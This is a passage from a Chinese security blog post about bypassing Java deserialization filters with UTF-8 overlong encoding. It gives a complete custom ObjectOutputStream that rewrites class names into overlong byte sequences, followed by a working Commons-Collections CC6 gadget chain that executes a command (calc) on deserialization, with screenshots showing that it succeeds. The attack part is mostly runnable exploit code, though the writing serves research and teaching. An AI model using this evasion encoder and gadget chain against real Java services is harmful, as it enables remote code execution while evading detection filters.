<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeUTF</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//写入name（jdk原生写入方法）</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//写入name(两个字节表示一个字符)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//写入name(三个字节表示一个字符)</span><br>        charWriteThreeBytes(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过测试"><a href="#绕过测试" class="headerlink" title="绕过测试"></a>绕过测试</h2><p>这里直接打一个普通cc6的链子来测试是否可用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.overlong;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.clown.Utils.CustomObjectOutputStream;<br><span class="hljs-keyword">import</span> org.clown.Utils.UTF8OutputStream;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br><span class="hljs-comment">//        serialize(hashMap);</span><br><span class="hljs-comment">//        serialize1(hashMap);</span><br><span class="hljs-comment">//        serialize2(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        CustomObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//正常序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize1</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//重写writeUTF的序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize2</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        UTF8OutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<span class="hljs-comment">//用重写过的ObjectOutputStream来序列化</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以去看一下使用前后字节流的变化</p><p><img src="https://cdn.clown2024.cn/image-20241022221131584.png" alt="image-20241022221131584"></p><p><img src="https://cdn.clown2024.cn/image-20241022221119279.png" alt="image-20241022221119279"></p><p>可以看到也是成功变成不可读的类名了,反序列化也是能正常弹计算器的</p><p><img src="https://cdn.clown2024.cn/image-20241022221255341.png" alt="image-20241022221255341"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/13932?accounttraceid=6f1030b220f8464eb2815f87796f4570daql&time__1311=eqRxyDcGG=k8D/D0D5IheGuDYwe=jDQwhD&alichlgref=https://account.aliyun.com/&u_atoken=569ca1e0aebe29a9b429829147e2aae3&u_asig=0a472f9217296064164077608e011c">java原生反序列化OverlongEncoding分析及实战 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg">UTF-8 Overlong Encoding导致的安全问题</a></p>]]></content>
    
    
      
      
